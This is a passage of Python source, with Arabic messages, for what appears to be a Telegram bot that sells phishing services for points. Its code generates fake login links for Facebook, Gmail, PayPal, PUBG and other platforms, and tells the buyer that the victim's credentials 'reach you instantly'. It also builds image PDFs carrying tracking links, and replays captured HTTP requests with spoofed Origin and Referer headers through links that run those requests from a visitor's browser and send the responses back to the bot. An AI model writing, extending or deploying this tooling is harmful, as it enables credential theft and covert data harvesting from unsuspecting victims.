                "✅ رائع! أنت مشترك في جميع القنوات المطلوبة!\n\n"
                "أرسل /start للمتابعة"
            )
        else:
            keyboard = []
            message = "⚠️ لا زلت غير مشترك في بعض القنوات:\n\n"
            
            for channel in not_subscribed_channels:
                channel_name = channel.get('channel_name', 'القناة')
                channel_username = channel.get('channel_username', '')
                
                if channel_username:
                    if not channel_username.startswith('@'):
                        channel_username = '@' + channel_username
                    keyboard.append([InlineKeyboardButton(f"📢 {channel_name}", url=f"https://t.me/{channel_username[1:]}")])
                    message += f"• {channel_name} ({channel_username})\n"
                else:
                    message += f"• {channel_name}\n"
            
            keyboard.append([InlineKeyboardButton("✅ تحقق من الاشتراك", callback_data="check_subscription")])
            
            await query.edit_message_text(
                message + "\n\n✅ اشترك في القنوات ثم اضغط على الزر للتحقق:",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    if context.user_data.get('waiting_for_image'):
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_photo:
            await file.download_to_drive(temp_photo.name)
            photo_path = temp_photo.name
        
        sessions = load_sessions()
        domain = get_domain()
        link = f"https://{domain}/p/{user_id}"
        
        img = Image.open(photo_path)
        img_width, img_height = img.size
        
        pdf_path = tempfile.NamedTemporaryFile(suffix='.pdf', delete=False).name
        c = canvas.Canvas(pdf_path, pagesize=(img_width, img_height))
        
        c.drawImage(photo_path, 0, 0, width=img_width, height=img_height)
        
        c.linkURL(link, (0, 0, img_width, img_height), relative=0)
        
        c.save()
        
        users = load_users()
        users[user_id].setdefault('conversions', 0)
        users[user_id]['conversions'] += 1
        save_users(users)
        
        keyboard = [
            [InlineKeyboardButton("🔄 تحويل صورة أخرى", callback_data="convert_to_pdf")],
            [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_document(
            document=open(pdf_path, 'rb'),
            filename=f'image_to_pdf_{user_id}.pdf',
            caption=f"✅ تم التحويل بنجاح!\n\n🔗 الرابط المضمن في PDF:\n{link}\n\n💡 عند الضغط على الصورة في PDF سيتم فتح الرابط",
            reply_markup=reply_markup
        )
        
        os.unlink(photo_path)
        os.unlink(pdf_path)
        
        context.user_data['waiting_for_image'] = False
    
    elif context.user_data.get('waiting_for_vip_image'):
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        
        if not os.path.exists('vip_images'):
            os.makedirs('vip_images')
        
        image_filename = f"{user_id}_{secrets.token_hex(8)}.jpg"
        image_path = os.path.join('vip_images', image_filename)
        
        await file.download_to_drive(image_path)
        
        users = load_users()
        if user_id not in users:
            users[user_id] = {
                'user_id': user_id,
                'points': 0,
                'created_at': datetime.now().isoformat(),
                'referrals': [],
                'total_visits': 0
            }
        
        context.user_data['temp_vip_image'] = f'/vip_images/{image_filename}'
        
        context.user_data['waiting_for_vip_image'] = False
        context.user_data['waiting_for_vip_link'] = True
        
        await update.message.reply_text(
            f"✅ تم حفظ الصورة بنجاح!\n\n"
            f"🔗 الآن أرسل الرابط الذي تريد التوجيه إليه:\n\n"
            f"مثال: https://t.me/yourchannel\n\n"
            f"💡 عند فتح رابط VIP، سيتم جمع البيانات ثم توجيه الزائر لهذا الرابط"
        )
    
    elif context.user_data.get('waiting_for_custom_image'):
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        
        if not os.path.exists('custom_link_images'):
            os.makedirs('custom_link_images')
        
        image_filename = f"{user_id}_{secrets.token_hex(8)}.jpg"
        image_path = os.path.join('custom_link_images', image_filename)
        
        await file.download_to_drive(image_path)
        
        users = load_users()
        if user_id not in users:
            users[user_id] = {
                'user_id': user_id,
                'points': 0,
                'created_at': datetime.now().isoformat(),
                'referrals': [],
                'total_visits': 0
            }
        
        context.user_data['temp_custom_image'] = f'/custom_link_images/{image_filename}'
        
        context.user_data['waiting_for_custom_image'] = False
        context.user_data['waiting_for_custom_redirect'] = True
        
        await update.message.reply_text(
            f"✅ تم حفظ الصورة بنجاح!\n\n"
            f"🔗 الآن أرسل الرابط الذي تريد التوجيه إليه:\n\n"
            f"مثال: https://t.me/yourchannel\n\n"
            f"💡 عند فتح الرابط الخاص، سيتم جمع البيانات المختارة فقط ثم توجيه الزائر لهذا الرابط"
        )

async def execute_http_request_variations_with_redirect(raw_request, domain, user_id, context):
    try:
        lines = raw_request.strip().split('\n')
        if not lines:
            return {'success': False, 'error': 'الطلب فارغ!'}
        
        request_line = lines[0].strip()
        parts = request_line.split()
        
        if len(parts) < 2:
            return {'success': False, 'error': 'صيغة الطلب غير صحيحة! يجب أن يحتوي على METHOD و PATH على الأقل'}
        
        method = parts[0].upper()
        path = parts[1]
        
        headers = {}
        original_host = None
        original_origin = None
        original_referer = None
        request_body = None
        body_started = False
        
        for i, line in enumerate(lines[1:], 1):
            line_stripped = line.strip()
            
            if not line_stripped and not body_started:
                body_started = True
                if i + 1 < len(lines):
                    request_body = '\n'.join(lines[i+1:]).strip()
                break
            
            if not body_started and ':' in line_stripped:
                key, value = line_stripped.split(':', 1)
                key = key.strip().lower()
                value = value.strip()
                headers[key] = value
                
                if key == 'host':
                    original_host = value
                elif key == 'origin':
                    original_origin = value
                elif key == 'referer':
                    original_referer = value
        
        if not original_host:
            return {'success': False, 'error': 'لم يتم العثور على header \'host\' في الطلب!'}
        
        base_url = f"https://{original_host}{path}"
        
        variations = []
        domain_with_protocol = f"https://{domain}"
        domain_without_protocol = domain
        
        variations.append({
            'name': 'محاولة 1: Origin فقط مع https://',
            'origin': domain_with_protocol,
            'referer': original_referer
        })
        
        variations.append({
            'name': 'محاولة 2: Origin فقط بدون https://',
            'origin': domain_without_protocol,
            'referer': original_referer
        })
        
        variations.append({
            'name': 'محاولة 3: Referer فقط مع https://',
            'origin': original_origin,
            'referer': domain_with_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 4: Referer فقط بدون https://',
            'origin': original_origin,
            'referer': domain_without_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 5: كلاهما مع https://',
            'origin': domain_with_protocol,
            'referer': domain_with_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 6: كلاهما بدون https://',
            'origin': domain_without_protocol,
            'referer': domain_without_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 7: الأصلي (بدون تعديل)',
            'origin': original_origin,
            'referer': original_referer
        })
        
        successful_attempt = None
        
        for idx, variation in enumerate(variations, 1):
            attempt_headers = headers.copy()
            
            if variation['origin']:
                attempt_headers['origin'] = variation['origin']
            elif 'origin' in attempt_headers:
                del attempt_headers['origin']
            
            if variation['referer']:
                attempt_headers['referer'] = variation['referer']
            elif 'referer' in attempt_headers:
                del attempt_headers['referer']
            
            attempt_headers['Accept-Encoding'] = 'identity'
            
            try:
                if method == 'GET':
                    response = requests.get(base_url, headers=attempt_headers, timeout=10, allow_redirects=True)
                elif method == 'POST':
                    response = requests.post(base_url, headers=attempt_headers, data=request_body, timeout=10, allow_redirects=True)
                elif method in ['PUT', 'PATCH']:
                    response = requests.request(method, base_url, headers=attempt_headers, data=request_body, timeout=10, allow_redirects=True)
                else:
                    response = requests.request(method, base_url, headers=attempt_headers, timeout=10, allow_redirects=True)
                
                decoded_content = decode_response_content(response)
                
                if 200 <= response.status_code < 300 and not successful_attempt:
                    extractable_data = extract_extractable_fields(response, decoded_content)
                    successful_attempt = {
                        'variation': variation,
                        'status': response.status_code,
                        'response': decoded_content,
                        'extractable_fields': extractable_data.get('fields', {}),
                        'extractable_fields_display': extractable_data.get('display', {}),
                        'response_object': response
                    }
                    break
                
            except Exception:
                continue
        
        if successful_attempt:
            return {
                'success': True,
                'status_code': successful_attempt['status'],
                'url': base_url,
                'response': successful_attempt['response'],
                'extractable_fields': successful_attempt.get('extractable_fields_display', {}),
                'request_data': {
                    'raw_request': raw_request,
                    'method': method,
                    'url': base_url,
                    'headers': headers,
                    'request_body': request_body,
                    'successful_origin': successful_attempt['variation']['origin'],
                    'successful_referer': successful_attempt['variation']['referer'],
                    'status_code': successful_attempt['status'],
                    'response_preview': successful_attempt['response'][:500] if successful_attempt['response'] else None,
                    'extractable_fields': successful_attempt.get('extractable_fields', {}),
                    'extractable_fields_display': successful_attempt.get('extractable_fields_display', {}),
                    'selected_fields': [],
                    'created_at': datetime.now().isoformat()
                }
            }
        else:
            return {'success': False, 'error': 'فشلت جميع المحاولات'}
        
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def execute_http_request_variations(raw_request, domain, user_id, context):
    try:
        lines = raw_request.strip().split('\n')
        if not lines:
            return "❌ الطلب فارغ!"
        
        request_line = lines[0].strip()
        parts = request_line.split()
        
        if len(parts) < 2:
            return "❌ صيغة الطلب غير صحيحة! يجب أن يحتوي على METHOD و PATH على الأقل"
        
        method = parts[0].upper()
        path = parts[1]
        
        headers = {}
        original_host = None
        original_origin = None
        original_referer = None
        request_body = None
        body_started = False
        
        for i, line in enumerate(lines[1:], 1):
            line_stripped = line.strip()
            
            if not line_stripped and not body_started:
                body_started = True
                if i + 1 < len(lines):
                    request_body = '\n'.join(lines[i+1:]).strip()
                break
            
            if not body_started and ':' in line_stripped:
                key, value = line_stripped.split(':', 1)
                key = key.strip().lower()
                value = value.strip()
                headers[key] = value
                
                if key == 'host':
                    original_host = value
                elif key == 'origin':
                    original_origin = value
                elif key == 'referer':
                    original_referer = value
        
        if not original_host:
            return "❌ لم يتم العثور على header 'host' في الطلب!"
        
        base_url = f"https://{original_host}{path}"
        
        variations = []
        domain_with_protocol = f"https://{domain}"
        domain_without_protocol = domain
        
        variations.append({
            'name': 'محاولة 1: Origin فقط مع https://',
            'origin': domain_with_protocol,
            'referer': original_referer
        })
        
        variations.append({
            'name': 'محاولة 2: Origin فقط بدون https://',
            'origin': domain_without_protocol,
            'referer': original_referer
        })
        
        variations.append({
            'name': 'محاولة 3: Referer فقط مع https://',
            'origin': original_origin,
            'referer': domain_with_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 4: Referer فقط بدون https://',
            'origin': original_origin,
            'referer': domain_without_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 5: كلاهما مع https://',
            'origin': domain_with_protocol,
            'referer': domain_with_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 6: كلاهما بدون https://',
            'origin': domain_without_protocol,
            'referer': domain_without_protocol + '/'
        })
        
        variations.append({
            'name': 'محاولة 7: الأصلي (بدون تعديل)',
            'origin': original_origin,
            'referer': original_referer
        })
        
        result_message = f"🌐 نتائج تنفيذ الطلب\n\n"
        result_message += f"📊 الطلب الأصلي:\n"
        result_message += f"Method: {method}\n"
        result_message += f"URL: {base_url}\n"
        result_message += f"Host: {original_host}\n\n"
        result_message += f"━━━━━━━━━━━━━━━━\n\n"
        
        successful_attempt = None
        
        for idx, variation in enumerate(variations, 1):
            attempt_headers = headers.copy()
            
            if variation['origin']:
                attempt_headers['origin'] = variation['origin']
            elif 'origin' in attempt_headers:
                del attempt_headers['origin']
            
            if variation['referer']:
                attempt_headers['referer'] = variation['referer']
            elif 'referer' in attempt_headers:
                del attempt_headers['referer']
            
            attempt_headers['Accept-Encoding'] = 'identity'
            
            try:
                if method == 'GET':
                    response = requests.get(base_url, headers=attempt_headers, timeout=10, allow_redirects=True)
                elif method == 'POST':
                    response = requests.post(base_url, headers=attempt_headers, data=request_body, timeout=10, allow_redirects=True)
                elif method in ['PUT', 'PATCH']:
                    response = requests.request(method, base_url, headers=attempt_headers, data=request_body, timeout=10, allow_redirects=True)
                else:
                    response = requests.request(method, base_url, headers=attempt_headers, timeout=10, allow_redirects=True)
                
                status_icon = "✅" if 200 <= response.status_code < 300 else "⚠️"
                
                decoded_content = decode_response_content(response)
                
                result_message += f"{status_icon} {variation['name']}\n"
                result_message += f"Status: {response.status_code}\n"
                
                if variation['origin']:
                    result_message += f"Origin: {variation['origin']}\n"
                if variation['referer']:
                    result_message += f"Referer: {variation['referer']}\n"
                
                content_preview = decoded_content[:200] if decoded_content else "فارغ"
                result_message += f"Response: {content_preview}...\n"
                result_message += f"━━━━━━━━━━━━━━━━\n\n"
                
                if 200 <= response.status_code < 300 and not successful_attempt:
                    successful_attempt = {
                        'variation': variation,
                        'status': response.status_code,
                        'response': decoded_content
                    }
                
            except Exception as e:
                result_message += f"❌ {variation['name']}\n"
                result_message += f"خطأ: {str(e)}\n"
                result_message += f"━━━━━━━━━━━━━━━━\n\n"
        
        if successful_attempt:
            result_message += f"\n🎉 نجحت المحاولة: {successful_attempt['variation']['name']}\n"
            result_message += f"📊 Status Code: {successful_attempt['status']}\n\n"
            
            sessions = load_sessions()
            if user_id not in sessions:
                sessions[user_id] = {
                    'user_id': user_id,
                    'visits': 0,
                    'created_at': datetime.now().isoformat(),
                    'phish_links': [],
                    'http_requests': []
                }
            
            if 'http_requests' not in sessions[user_id]:
                sessions[user_id]['http_requests'] = []
            
            link_id = len(sessions[user_id]['http_requests'])
            
            sessions[user_id]['http_requests'].append({
                'link_id': link_id,
                'raw_request': raw_request,
                'method': method,
                'url': base_url,
                'headers': headers,
                'request_body': request_body,
                'successful_origin': successful_attempt['variation']['origin'],
                'successful_referer': successful_attempt['variation']['referer'],
                'status_code': successful_attempt['status'],
                'response_preview': successful_attempt['response'][:500] if successful_attempt['response'] else None,
                'created_at': datetime.now().isoformat(),
                'active': True
            })
            
            save_sessions(sessions)
            
            execute_link = f"https://{domain}/{method}/{link_id}/{user_id}"
            result_message += f"🔗 تم إنشاء رابط التنفيذ:\n{execute_link}\n\n"
            result_message += f"💡 عند زيارة هذا الرابط، سيتم:\n"
            result_message += f"   1️⃣ تنفيذ الطلب HTTP تلقائياً\n"
            result_message += f"   2️⃣ إرسال النتيجة للبوت\n\n"
            
            lines = successful_attempt['response'].split('\n')
            line_count = len(lines)
            
            result_message += f"📊 عدد الأسطر: {line_count} سطر\n\n"
            
            if line_count > 150:
                result_message += f"📄 Response (أول 1000 حرف):\n{successful_attempt['response'][:1000]}...\n\n"
                result_message += f"⚠️ الرد كبير جداً ({line_count} سطر)!\n"
                result_message += f"💡 عند فتح الرابط، سيتم إرسال الرد كاملاً في ملف"
            elif len(successful_attempt['response']) > 1000:
                result_message += f"📄 Response:\n{successful_attempt['response'][:1000]}...\n\n"
                result_message += f"⚠️ الرد كبير جداً، تم عرض أول 1000 حرف فقط"
            else:
                result_message += f"📄 Response:\n{successful_attempt['response']}"
        else:
            result_message += f"\n❌ فشلت جميع المحاولات!"
        
        return result_message
        
    except Exception as e:
        return f"❌ حدث خطأ في معالجة الطلب:\n\n{str(e)}"

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    text = update.message.text
    
    if context.user_data.get('waiting_for_http_request'):
        context.user_data['waiting_for_http_request'] = False
        
        await update.message.reply_text(
            "⏳ جاري معالجة الطلب...\n\n"
            "🔄 سيتم تجربة الطلب بعدة تركيبات من الـ headers\n"
            "📊 انتظر قليلاً..."
        )
        
        try:
            domain = get_domain()
            result_message = await execute_http_request_variations(text, domain, user_id, context)
            
            if len(result_message) > 4000:
                chunks = [result_message[i:i+4000] for i in range(0, len(result_message), 4000)]
                for chunk in chunks:
                    await update.message.reply_text(chunk)
            else:
                await update.message.reply_text(result_message)
        except Exception as e:
            await update.message.reply_text(
                f"❌ حدث خطأ أثناء معالجة الطلب:\n\n"
                f"{str(e)}\n\n"
                f"أرسل /start للرجوع للقائمة"
            )
        
        return
    
    if context.user_data.get('waiting_for_http_request_with_redirect'):
        context.user_data['waiting_for_http_request_with_redirect'] = False
        
        await update.message.reply_text(
            "⏳ جاري معالجة الطلب...\n\n"
            "🔄 سيتم تجربة الطلب بعدة تركيبات من الـ headers\n"
            "📊 انتظر قليلاً..."
        )
        
        try:
            domain = get_domain()
            result = await execute_http_request_variations_with_redirect(text, domain, user_id, context)
            
            if result.get('success'):
                context.user_data['waiting_for_redirect_url_for_http'] = True
                context.user_data['temp_http_request_data'] = result['request_data']
                
                await update.message.reply_text(
                    f"✅ نجح الطلب HTTP!\n\n"
                    f"📊 Status: {result['status_code']}\n"
                    f"🌐 URL: {result['url']}\n\n"
                    f"📄 Response (أول 500 حرف):\n{result['response'][:500]}...\n\n"
                    f"━━━━━━━━━━━━━━━━\n\n"
                    f"🔗 الآن أرسل رابط التوجيه (Redirect URL)\n\n"
                    f"💡 عند زيارة الرابط النهائي:\n"
                    f"   1️⃣ سيتم تنفيذ طلب HTTP في الخلفية\n"
                    f"   2️⃣ إرسال النتيجة للبوت\n"
                    f"   3️⃣ إعادة توجيه تلقائية للرابط الذي سترسله\n\n"
                    f"أرسل الرابط الآن:"
                )
            else:
                await update.message.reply_text(
                    f"❌ فشلت جميع محاولات تنفيذ الطلب!\n\n"
                    f"تفاصيل الخطأ:\n{result.get('error', 'غير معروف')}\n\n"
                    f"أرسل /start للرجوع للقائمة"
                )
        except Exception as e:
            await update.message.reply_text(
                f"❌ حدث خطأ أثناء معالجة الطلب:\n\n"
                f"{str(e)}\n\n"
                f"أرسل /start للرجوع للقائمة"
            )
        
        return
    
    if context.user_data.get('waiting_for_redirect_url_for_http'):
        context.user_data['waiting_for_redirect_url_for_http'] = False
        redirect_url = text.strip()
        
        if not redirect_url.startswith('http://') and not redirect_url.startswith('https://'):
            await update.message.reply_text(
                "❌ الرابط غير صحيح!\n\n"
                "⚠️ يجب أن يبدأ الرابط بـ http:// أو https://\n\n"
                "أرسل رابط صحيح أو /start للإلغاء:"
            )
            context.user_data['waiting_for_redirect_url_for_http'] = True
            return
        
        try:
            request_data = context.user_data.get('temp_http_request_data')
            if not request_data:
                await update.message.reply_text("❌ حدث خطأ: لم يتم العثور على بيانات الطلب\n\nأرسل /start للبدء من جديد")
                return
            
            sessions = load_sessions()
            if user_id not in sessions:
                sessions[user_id] = {
                    'user_id': user_id,
                    'visits': 0,
                    'created_at': datetime.now().isoformat(),
                    'phish_links': [],
                    'http_requests': []
                }
            
            if 'http_requests' not in sessions[user_id]:
                sessions[user_id]['http_requests'] = []
            
            link_id = len(sessions[user_id]['http_requests'])
            
            request_data['redirect_url'] = redirect_url
            request_data['link_id'] = link_id
            request_data['active'] = True
            
            sessions[user_id]['http_requests'].append(request_data)
            save_sessions(sessions)
            
            domain = get_domain()
            execute_link = f"https://{domain}/{request_data['method']}/redirect/{link_id}/{user_id}"
            
            await update.message.reply_text(
                f"✅ تم إنشاء الرابط بنجاح!\n\n"
                f"🔗 رابط التنفيذ + Redirect:\n{execute_link}\n\n"
                f"━━━━━━━━━━━━━━━━\n\n"
                f"💡 عند زيارة هذا الرابط:\n"
                f"   1️⃣ تنفيذ طلب HTTP: {request_data['url']}\n"
                f"   2️⃣ إرسال النتيجة للبوت\n"
                f"   3️⃣ Redirect تلقائي إلى: {redirect_url}\n\n"
                f"🎯 الرابط جاهز للاستخدام!"
            )
            
            context.user_data['temp_http_request_data'] = None
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ حدث خطأ أثناء إنشاء الرابط:\n\n"
                f"{str(e)}\n\n"
                f"أرسل /start للرجوع للقائمة"
            )
        
        return
    
    if context.user_data.get('waiting_for_multi_http_request'):
        context.user_data['waiting_for_multi_http_request'] = False
        
        await update.message.reply_text(
            "⏳ جاري معالجة الطلب...\n\n"
            "🔄 سيتم تجربة الطلب بعدة تركيبات من الـ headers\n"
            "📊 انتظر قليلاً..."
        )
        
        try:
            domain = get_domain()
            result = await execute_http_request_variations_with_redirect(text, domain, user_id, context)
            
            if result.get('success'):
                if 'multi_http_requests_buffer' not in context.user_data:
                    context.user_data['multi_http_requests_buffer'] = []
                
                request_index = len(context.user_data['multi_http_requests_buffer'])
                context.user_data['multi_http_requests_buffer'].append(result['request_data'])
                
                buffer_count = len(context.user_data['multi_http_requests_buffer'])
                
                extractable_fields = result.get('extractable_fields', {})
                
                if extractable_fields:
                    keyboard = [
                        [InlineKeyboardButton("📊 اختيار البيانات المطلوب سحبها", callback_data=f"show_fields_{request_index}")],
                        [InlineKeyboardButton("➕ إضافة طلب آخر", callback_data="multi_http_add_another")],
                        [InlineKeyboardButton("🚀 إنهاء وإرسال Redirect", callback_data="multi_http_finish_and_redirect")],
                        [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_multi_http_requests")]
                    ]
                    
                    await update.message.reply_text(
                        f"✅ نجح الطلب HTTP!\n\n"
                        f"📊 Status: {result['status_code']}\n"
                        f"🌐 URL: {result['url']}\n\n"
                        f"📄 Response (أول 300 حرف):\n{result['response'][:300]}...\n\n"
                        f"━━━━━━━━━━━━━━━━\n\n"
                        f"🎯 تم العثور على {len(extractable_fields)} حقل قابل للسحب!\n\n"
                        f"💡 اضغط على \"اختيار البيانات\" لتحديد ما تريد سحبه من الزائر\n"
                        f"أو تخطى هذه الخطوة وأكمل مباشرة\n\n"
                        f"📊 عدد الطلبات المحفوظة: {buffer_count}\n\n"
                        f"❓ ماذا تريد أن تفعل بعد ذلك؟",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                else:
                    keyboard = [
                        [InlineKeyboardButton("➕ إضافة طلب آخر", callback_data="multi_http_add_another")],
                        [InlineKeyboardButton("🚀 إنهاء وإرسال Redirect", callback_data="multi_http_finish_and_redirect")],
                        [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_multi_http_requests")]
                    ]
                    
                    await update.message.reply_text(
                        f"✅ نجح الطلب HTTP!\n\n"
                        f"📊 Status: {result['status_code']}\n"
                        f"🌐 URL: {result['url']}\n\n"
                        f"📄 Response (أول 300 حرف):\n{result['response'][:300]}...\n\n"
                        f"━━━━━━━━━━━━━━━━\n\n"
                        f"📊 عدد الطلبات المحفوظة: {buffer_count}\n\n"
                        f"❓ هل تريد إضافة طلب آخر أم إرسال رابط التوجيه؟",
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
            else:
                await update.message.reply_text(
                    f"❌ فشلت جميع محاولات تنفيذ الطلب!\n\n"
                    f"تفاصيل الخطأ:\n{result.get('error', 'غير معروف')}\n\n"
                    f"أرسل /start للرجوع للقائمة"
                )
        except Exception as e:
            await update.message.reply_text(
                f"❌ حدث خطأ أثناء معالجة الطلب:\n\n"
                f"{str(e)}\n\n"
                f"أرسل /start للرجوع للقائمة"
            )
        
        return
    
    if context.user_data.get('waiting_for_multi_redirect_url'):
        context.user_data['waiting_for_multi_redirect_url'] = False
        redirect_url = text.strip()
        
        if not redirect_url.startswith('http://') and not redirect_url.startswith('https://'):
            await update.message.reply_text(
                "❌ الرابط غير صحيح!\n\n"
                "⚠️ يجب أن يبدأ الرابط بـ http:// أو https://\n\n"
                "أرسل رابط صحيح أو /start للإلغاء:"
            )
            context.user_data['waiting_for_multi_redirect_url'] = True
            return
        
        try:
            requests_buffer = context.user_data.get('multi_http_requests_buffer', [])
            if not requests_buffer:
                await update.message.reply_text("❌ حدث خطأ: لا توجد طلبات محفوظة\n\nأرسل /start للبدء من جديد")
                return
            
            sessions = load_sessions()
            if user_id not in sessions:
                sessions[user_id] = {
                    'user_id': user_id,
                    'visits': 0,
                    'created_at': datetime.now().isoformat(),
                    'phish_links': [],
                    'http_requests': [],
                    'multi_http_requests': []
                }
            
            if 'multi_http_requests' not in sessions[user_id]:
                sessions[user_id]['multi_http_requests'] = []
            
            link_id = len(sessions[user_id]['multi_http_requests'])
            
            multi_request_data = {
                'link_id': link_id,
                'requests': requests_buffer,
                'redirect_url': redirect_url,
                'created_at': datetime.now().isoformat(),
                'active': True
            }
            
            sessions[user_id]['multi_http_requests'].append(multi_request_data)
            save_sessions(sessions)
            
            domain = get_domain()
            execute_link = f"https://{domain}/multi-http/{link_id}/{user_id}"
            
            requests_summary = "\n".join([
                f"   {i+1}. {req['method']} {req['url'][:50]}..."
                for i, req in enumerate(requests_buffer[:5])
            ])
            
            if len(requests_buffer) > 5:
                requests_summary += f"\n   ... و {len(requests_buffer) - 5} طلبات أخرى"
            
            await update.message.reply_text(
                f"✅ تم إنشاء الرابط بنجاح!\n\n"
                f"🔗 رابط التنفيذ المتعدد + Redirect:\n{execute_link}\n\n"
                f"━━━━━━━━━━━━━━━━\n\n"
                f"📊 عدد الطلبات: {len(requests_buffer)}\n\n"
                f"📋 الطلبات:\n{requests_summary}\n\n"
                f"💡 عند زيارة هذا الرابط:\n"
                f"   1️⃣ تنفيذ جميع الطلبات HTTP بسرعة\n"
                f"   2️⃣ إرسال النتائج للبوت\n"
                f"   3️⃣ Redirect تلقائي إلى: {redirect_url}\n\n"
                f"🎯 الرابط جاهز للاستخدام!"
            )
            
            context.user_data['multi_http_requests_buffer'] = []
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ حدث خطأ أثناء إنشاء الرابط:\n\n"
                f"{str(e)}\n\n"
                f"أرسل /start للرجوع للقائمة"
            )
        
        return
    
    if context.user_data.get('waiting_redirect_url'):
        platform = context.user_data['waiting_redirect_url']
        redirect_url = text.strip()
        
        if not redirect_url.startswith('http://') and not redirect_url.startswith('https://'):
            await update.message.reply_text(
                "❌ الرابط غير صحيح!\n\n"
                "⚠️ يجب أن يبدأ الرابط بـ http:// أو https://\n\n"
                "أرسل رابط صحيح أو /start للإلغاء:"
            )
            return
        
        users = load_users()
        users[user_id]['points'] -= 8
        save_users(users)
        
        domain = get_domain()
        sessions = load_sessions()
        
        if user_id not in sessions:
            sessions[user_id] = {
                'user_id': user_id,
                'visits': 0,
                'created_at': datetime.now().isoformat()
            }
        
        if 'phish_links' not in sessions[user_id]:
            sessions[user_id]['phish_links'] = []
        
        link_id = len(sessions[user_id]['phish_links'])
        
        sessions[user_id]['phish_links'].append({
            'platform': platform,
            'type': 'redirect',
            'link_id': link_id,
            'redirect_url': redirect_url,
            'created_at': datetime.now().isoformat(),
            'active': True,
            'purchased': True
        })
        
        save_sessions(sessions)
        
        # استخدام route خاص لـ PUBG
        if platform == 'pubg':
            phish_link = f"https://{domain}/pubg/{user_id}/{link_id}"
        else:
            phish_link = f"https://{domain}/phish/{platform}/{user_id}/{link_id}"
        
        platform_names = {
            'facebook': '📘 Facebook', 'instagram': '📷 Instagram', 'google': '🌐 Google',
            'gmail': '📧 Gmail', 'twitter': '🐦 Twitter', 'tiktok': '🎵 TikTok',
            'linkedin': '💼 LinkedIn', 'discord': '👾 Discord', 'snapchat': '💬 Snapchat',
            'twitch': '🎮 Twitch', 'netflix': '🎬 Netflix', 'spotify': '🎵 Spotify',
            'paypal': '💳 PayPal', 'steam': '🎮 Steam', 'whatsapp': '📱 WhatsApp',
            'github': '💻 GitHub', 'playstation': '🎮 PlayStation', 'xbox': '🎮 Xbox',
            'roblox': '🎮 Roblox', 'youtube': '📺 YouTube', 'pubg': '🎮 PUBG Mobile'
        }
        platform_name = platform_names.get(platform, platform.capitalize())
        
        keyboard = [
            [InlineKeyboardButton("🔙 رجوع للمنصات", callback_data="zphisher")],
            [InlineKeyboardButton("🏠 القائمة الرئيسية", callback_data="back_to_menu")]
        ]
        
        await update.message.reply_text(
            f"✅ تم إنشاء رابط {platform_name} مع إعادة توجيه!\n\n"
            f"🔗 الرابط:\n{phish_link}\n\n"
            f"🔄 رابط إعادة التوجيه:\n{redirect_url}\n\n"
            f"💎 نقاطك المتبقية: {users[user_id]['points']}\n\n"
            f"📊 كيف يعمل:\n"
            f"• الضحية يفتح الرابط\n"
            f"• يرى صفحة تسجيل دخول {platform_name}\n"
            f"• بعد إدخال البيانات، يتم توجيهه للرابط الذي اخترته\n"
            f"• البيانات تصلك فوراً!\n\n"
            f"📱 شارك الرابط الآن!",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        context.user_data['waiting_redirect_url'] = None
        return
    
    if context.user_data.get('waiting_for_promote_user_id'):
        if not is_main_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        target_user_id = text.strip()
        users = load_users()
        
        if target_user_id not in users:
            await update.message.reply_text(
                "❌ هذا المستخدم غير موجود في قاعدة البيانات!\n\n"
                "⚠️ يجب أن يكون المستخدم قد تفاعل مع البوت من قبل\n\n"
                "أرسل /start للرجوع أو أرسل ID آخر:"
            )
            return
        
        assistant_admins = load_assistant_admins()
        if target_user_id in assistant_admins:
            await update.message.reply_text(
                "⚠️ هذا المستخدم إدمن مساعد بالفعل!\n\n"
                "أرسل /start للرجوع"
            )
            context.user_data['waiting_for_promote_user_id'] = False
            return
        
        user_info = users[target_user_id]
        points = user_info.get('points', 0)
        referrals_count = len(user_info.get('referrals', []))
        created_at = user_info.get('created_at', 'غير معروف')
        
        keyboard = [
            [InlineKeyboardButton("✅ نعم، ترقية", callback_data=f"confirm_promote_{target_user_id}")],
            [InlineKeyboardButton("❌ إلغاء", callback_data=f"cancel_promote_{target_user_id}")]
        ]
        
        await update.message.reply_text(
            f"📋 معلومات المستخدم:\n\n"
            f"👤 ID: {target_user_id}\n"
            f"💎 النقاط: {points}\n"
            f"👥 الإحالات: {referrals_count}\n"
            f"📅 تاريخ التسجيل: {created_at}\n\n"
            f"❓ هل تريد ترقية هذا المستخدم إلى إدمن مساعد؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        context.user_data['waiting_for_promote_user_id'] = False
        return
    
    if context.user_data.get('waiting_for_points_user_id'):
        if not is_admin(user_id):
            await update.message.reply_text("⛔ غير مصرح لك!")
            return
        
        target_user_id = text.strip()
        users = load_users()
        
        if target_user_id not in users:
            await update.message.reply_text(
                "❌ هذا المستخدم غير موجود في قاعدة البيانات!\n\n"
                "⚠️ يجب أن يكون المستخدم قد تفاعل مع البوت من قبل\n\n"
                "أرسل /start للرجوع أو أرسل ID آخر:"
            )
            return
        
